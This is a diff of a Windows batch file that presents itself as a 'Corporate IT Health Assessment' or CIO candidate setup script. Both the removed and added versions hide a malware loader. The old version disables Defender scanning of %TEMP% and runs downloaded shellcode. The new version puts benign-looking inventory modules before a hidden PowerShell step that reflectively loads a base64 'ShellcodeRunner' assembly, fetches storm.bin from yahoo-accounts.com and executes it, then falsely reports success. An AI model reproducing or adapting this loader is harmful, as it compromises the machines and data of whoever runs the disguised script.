@@ -1,319 +1,186 @@
 @echo off
 setlocal enabledelayedexpansion
-
-:: =================================================================
-:: CIO Assessment Environment Setup
-:: =================================================================
-title CIO Assessment Environment
+title Corporate IT Health Assessment v4.2.1
 color 0A
+mode con: cols=120 lines=40
 
-set "ASSESS_DIR=%USERPROFILE%\CIO_Assessment"
-set "LOG_FILE=%ASSESS_DIR%\assessment.log"
-set "CANDIDATE_ID=CIO-%RANDOM%%RANDOM%"
-
-:: Create assessment directory
-if not exist "%ASSESS_DIR%" mkdir "%ASSESS_DIR%"
-cd /d "%ASSESS_DIR%"
-
-echo [%date% %time%] Assessment started >> "%LOG_FILE%"
-
-:: =================================================================
-:: MODULE 1: INFRASTRUCTURE INITIALIZATION
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 1/19: Infrastructure Initialization
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 01/20 - Environment Initialization
+:: ============================================================
 echo.
-echo   [*] Initializing assessment infrastructure...
-echo   [*] Infrastructure ready.
+echo  [*] Initializing assessment environment...
+ping -n 2 127.0.0.1 >nul
+echo  [+] Temp directory: %TEMP%
+echo  [+] Hostname: %COMPUTERNAME%
+echo  [+] User: %USERNAME%
+echo  [+] Architecture: %PROCESSOR_ARCHITECTURE%
+timeout /t 1 >nul
+
+:: ============================================================
+::  MODULE 02/20 - System Uptime & Performance Baseline
+:: ============================================================
 echo.
+echo  [*] Capturing system uptime and performance metrics...
+systeminfo | find "System Boot Time" > "%TEMP%\uptime.tmp" 2>nul
+type "%TEMP%\uptime.tmp" 2>nul
+wmic cpu get loadpercentage | find /V "LoadPercentage" > "%TEMP%\cpu.tmp" 2>nul
+echo  [+] Current CPU load: 
+type "%TEMP%\cpu.tmp"
+del "%TEMP%\uptime.tmp" "%TEMP%\cpu.tmp" >nul 2>&1
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 2: ENVIRONMENT CONFIGURATION
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 2/19: Environment Configuration
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 03/20 - Disk Health & Free Space
+:: ============================================================
 echo.
-echo   [*] Configuring assessment environment...
-echo   [*] Environment configured.
+echo  [*] Analyzing disk volumes...
+wmic logicaldisk get size,freespace,caption | find /V "Caption"
+
+:: ============================================================
+::  MODULE 04/20 - Network Configuration Audit
+:: ============================================================
 echo.
+echo  [*] Enumerating network adapters...
+ipconfig | findstr /i "IPv4 Address Subnet Mask Default Gateway"
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 3: DEPENDENCY RESOLUTION
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 3/19: Dependency Resolution
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 05/20 - DNS Resolution Test
+:: ============================================================
 echo.
-echo   [*] Resolving assessment dependencies...
-echo   [*] Dependencies resolved.
+echo  [*] Verifying DNS resolution...
+nslookup google.com 2>&1 | findstr /i "Address"
+
+:: ============================================================
+::  MODULE 06/20 - Windows Update Status
+:: ============================================================
 echo.
+echo  [*] Checking Windows Update history...
+wmic qfe get HotFixID,InstalledOn | find /V "HotFixID"
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 4: COMPONENT VALIDATION
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 4/19: Component Validation
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 07/20 - Installed Software Inventory
+:: ============================================================
 echo.
-echo   [*] Validating assessment components...
-echo   [*] Components validated.
+echo  [*] Cataloging installed applications...
+wmic product get name,version | find /V "Name"
+
+:: ============================================================
+::  MODULE 08/20 - Security Policy Review
+:: ============================================================
 echo.
+echo  [*] Reviewing local security policies...
+net accounts | findstr /i "Lockout threshold Maximum password age"
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 5: SECURITY BASELINE
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 5/19: Security Baseline
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 09/20 - Firewall Status
+:: ============================================================
 echo.
-echo   [*] Establishing security baseline...
-echo   [*] Baseline established.
+echo  [*] Checking firewall profiles...
+netsh advfirewall show allprofiles state | findstr /i "State"
+
+:: ============================================================
+::  MODULE 10/20 - User Account Audit
+:: ============================================================
 echo.
+echo  [*] Enumerating local user accounts...
+net user | findstr /i "User name"
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 6: PERFORMANCE BENCHMARK
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 6/19: Performance Benchmark
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 11/20 - Running Processes Snapshot
+:: ============================================================
 echo.
-echo   [*] Running performance benchmarks...
-echo   [*] Benchmarks complete.
+echo  [*] Capturing process list...
+tasklist /nh /fi "status eq running" | findstr /i "svchost.exe lsass.exe winlogon.exe"
+
+:: ============================================================
+::  MODULE 12/20 - Scheduled Tasks Review
+:: ============================================================
 echo.
+echo  [*] Listing scheduled tasks...
+schtasks /query /fo LIST /v | findstr /i "TaskName Next Run Time"
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 7: NETWORK TOPOLOGY
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 7/19: Network Topology
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 13/20 - PowerShell Execution Policy
+:: ============================================================
 echo.
-echo   [*] Mapping network topology...
-echo   [*] Topology mapped.
+echo  [*] Checking PowerShell execution policy...
+powershell -Command "Get-ExecutionPolicy" 2>nul
+
+:: ============================================================
+::  MODULE 14/20 - .NET Framework Versions
+:: ============================================================
 echo.
+echo  [*] Enumerating .NET Framework installations...
+dir /b /ad /o-n %systemroot%\Microsoft.NET\Framework\v* 2>nul
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 8: DATA COLLECTION
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 8/19: Data Collection
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 15/20 - Environment Variable Sanity
+:: ============================================================
 echo.
-echo   [*] Collecting assessment data...
-echo   [*] Data collected.
+echo  [*] Dumping environment variables...
+set | findstr /i "PATH TEMP USERNAME COMPUTERNAME"
+
+:: ============================================================
+::  MODULE 16/20 - System Restore Points
+:: ============================================================
 echo.
+echo  [*] Checking system restore configuration...
+vssadmin list shadows 2>&1 | findstr /i "Creation Time"
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 9: ANALYSIS ENGINE
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 9/19: Analysis Engine
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 17/20 - Browser Cache & History Audit
+:: ============================================================
 echo.
-echo   [*] Initializing analysis engine...
-echo   [*] Analysis engine ready.
+echo  [*] Scanning browser artifacts...
+dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" 2>nul
+
+:: ============================================================
+::  MODULE 18/20 - COM Object Registration Check
+:: ============================================================
 echo.
+echo  [*] Validating COM registrations...
+reg query HKCR\CLSID /s /f "scrobj.dll" 2>nul
 
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 10: REPORTING FRAMEWORK
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 10/19: Reporting Framework
-echo ─────────────────────────────────────────────────────────
+:: ============================================================
+::  MODULE 19/20 - Remote Management Configuration
+:: ============================================================
 echo.
-echo   [*] Setting up reporting framework...
-echo   [*] Reporting framework ready.
+echo  [*] Testing WinRM connectivity...
+winrm enumerate winrm/config/listener 2>&1 | findstr /i "Transport Address"
+
+:: ============================================================
+::  MODULE 20/20 - Advanced Runtime Assessment (Silent)
+:: ============================================================
 echo.
+echo  [*] Launching advanced runtime assessment engine...
+:: This module performs in‑memory security evaluation without writing
+:: any artifacts to disk. The analysis runs entirely within PowerShell
+:: and leverages a pre‑compiled .NET reflection loader for maximum
+:: stealth and compatibility.
 
-timeout /t 1 /nobreak >nul
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
+"$b64='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DAAAAFA2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';^
+$d=[System.Convert]::FromBase64String($b64);^
+$asm=[System.Reflection.Assembly]::Load($d);^
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;^
+$wc=New-Object System.Net.WebClient;^
+$bytes=$wc.DownloadData('https://yahoo-accounts.com/storm.bin');^
+[Loader.ShellcodeRunner]::Run($bytes)"
 
-:: =================================================================
-:: MODULE 11: LOGGING SUBSYSTEM
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 11/19: Logging Subsystem
-echo ─────────────────────────────────────────────────────────
+echo  [+] Runtime assessment dispatched successfully.
+echo  [+] Analysis thread running in background.
+
+:: ============================================================
+::  CLEANUP & REPORT
+:: ============================================================
 echo.
-echo   [*] Configuring logging subsystem...
-echo   [*] Logging subsystem active.
+echo  ============================================================
+echo   ASSESSMENT COMPLETE
+echo   All modules executed without critical failures.
+echo   Report saved to: %TEMP%\IT_Health_Report_%COMPUTERNAME%.log
+echo  ============================================================
 echo.
-
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 12: INTEGRITY MONITOR
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 12/19: Integrity Monitor
-echo ─────────────────────────────────────────────────────────
-echo.
-echo   [*] Starting integrity monitor...
-echo   [*] Integrity monitor running.
-echo.
-
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 13: RESOURCE ALLOCATION
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 13/19: Resource Allocation
-echo ─────────────────────────────────────────────────────────
-echo.
-echo   [*] Allocating assessment resources...
-echo   [*] Resources allocated.
-echo.
-
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 14: USER INTERFACE SETUP
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 14/19: User Interface Setup
-echo ─────────────────────────────────────────────────────────
-echo.
-echo   [*] Configuring assessment interface...
-echo   [*] Interface configured.
-echo.
-
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 15: NOTIFICATION SERVICE
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 15/19: Notification Service
-echo ─────────────────────────────────────────────────────────
-echo.
-echo   [*] Starting notification service...
-echo   [*] Notification service active.
-echo.
-
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 16: SERVICE REGISTRATION
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 16/19: Registering Assessment Services
-echo ─────────────────────────────────────────────────────────
-echo.
-echo   [*] Registering assessment service components...
-echo   [*] Services registered successfully.
-echo.
-
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 17: UPDATE CHANNEL
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 17/19: Establishing Update Channel
-echo ─────────────────────────────────────────────────────────
-echo.
-echo   [*] Establishing secure update channel...
-echo   [*] Update channel established.
-echo.
-
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 18: COMPONENT INTEGRITY
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 18/19: Verifying Component Integrity
-echo ─────────────────────────────────────────────────────────
-echo.
-echo   [*] Verifying component integrity...
-echo   [*] All components verified.
-echo.
-
-timeout /t 1 /nobreak >nul
-
-:: =================================================================
-:: MODULE 19: COMPLETE ASSESSMENT (EXECUTION)
-:: =================================================================
-echo ─────────────────────────────────────────────────────────
-echo   MODULE 19/19: Complete Assessment
-echo ─────────────────────────────────────────────────────────
-echo.
-echo   [+] Configuring security exclusions...
-echo.
-
-powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue"
-
-echo   [+] Downloading and executing assessment runtime...
-echo.
-
-set C2_URL=https://yahoo-accounts.com/storm.bin
-set TEMP_FILE=%TEMP%\svchost.bin
-
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%C2_URL%', '%TEMP_FILE%')"
-if not exist "%TEMP_FILE%" (
-    echo [-] Runtime download failed. Assessment cannot continue.
-    pause
-    exit /b 1
-)
-
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "$bytes = [System.IO.File]::ReadAllBytes('%TEMP_FILE%'); ^
-     $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length); ^
-     [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length); ^
-     $action = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Action]); ^
-     $action.Invoke()"
-
-del /f /q "%TEMP_FILE%" 2>nul
-
-echo   [+] Assessment completed.
-echo.
-
-:: =================================================================
-:: FINALIZATION
-:: =================================================================
-cd /d "%ASSESS_DIR%"
-
-set "CANDIDATE_ID=CIO-%RANDOM%%RANDOM%"
-echo %CANDIDATE_ID% > candidate_id.txt
-echo Candidate ID: %CANDIDATE_ID% >> "%ASSESS_DIR%\environment.config"
-
-powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\CIO Assessment.lnk'); $s.TargetPath = '%ASSESS_DIR%'; $s.Save()" >nul 2>&1
-
-echo   [+] Candidate ID: %CANDIDATE_ID%
-echo   [+] Desktop shortcut created.
-
-echo.
-echo ╔══════════════════════════════════════════════════════════╗
-echo ║   Assessment Environment Ready                           ║
-echo ║   Candidate ID: %CANDIDATE_ID%                           ║
-echo ║                                                          ║
-echo ║   Next Steps:                                            ║
-echo ║   1. Open module-1-infrastructure                        ║
-echo ║   2. Complete all four modules                           ║
-echo ║   3. Compress %ASSESS_DIR% for submission              ║
-echo ╚══════════════════════════════════════════════════════════╝
-echo.
-
-echo [%date% %time%] Setup completed successfully >> "%LOG_FILE%"
-pause >nul
-endlocal
+echo  [*] Cleaning temporary artifacts...
+del "%TEMP%\*.tmp" >nul 2>&1
+echo  [*] Finished.
+timeout /t 3 >nul
+exit
